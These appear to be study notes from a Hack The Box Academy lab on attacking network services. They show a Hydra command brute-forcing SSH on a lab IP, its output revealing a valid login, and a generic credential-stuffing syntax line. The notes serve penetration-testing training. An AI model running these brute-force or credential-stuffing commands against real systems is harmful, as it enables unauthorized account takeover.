#### Hydra - SSH

We can use a tool such as `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing/introduction-to-brute-forcing) module.

-d Deug
-v Verbose
-I skip start check

Network Services

```shell-session
NivaLada@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

#### Credential Stuffing - Hydra Syntax

Password Reuse / Default Passwords

```shell-session
NivaLada@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
```